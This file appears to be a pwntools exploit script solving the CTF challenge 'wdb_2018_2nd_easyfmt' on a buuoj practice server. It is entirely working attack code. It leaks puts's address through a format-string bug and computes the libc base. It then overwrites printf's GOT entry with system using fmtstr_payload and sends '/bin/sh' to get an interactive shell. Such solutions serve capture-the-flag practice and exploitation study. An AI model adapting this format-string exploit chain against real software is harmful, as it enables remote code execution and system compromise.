from pwn import *

#context.log_level = 'debug'

#p = process('./wdb_2018_2nd_easyfmt')
p = remote('node4.buuoj.cn', 25460)
elf = ELF('./wdb_2018_2nd_easyfmt')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_got = elf.got['puts']
printf_got = elf.got['printf']

#gdb.attach(p, 'b *0x80485d7')

payload = p32(puts_got) + b'%6$s'

p.sendafter(b'\n', payload)
puts_real_addr = u32(p.recv(8)[4:8])

libc_base = puts_real_addr - libc.sym['puts']

print('libc_base -> {}'.format(hex(libc_base)))
system = libc_base + libc.sym['system']

payload = fmtstr_payload(6, { printf_got: system }, write_size = 'byte', numbwritten = 0)

p.sendafter(b'\n', payload)

p.sendlineafter(b'\n', b'/bin/sh')

p.interactive()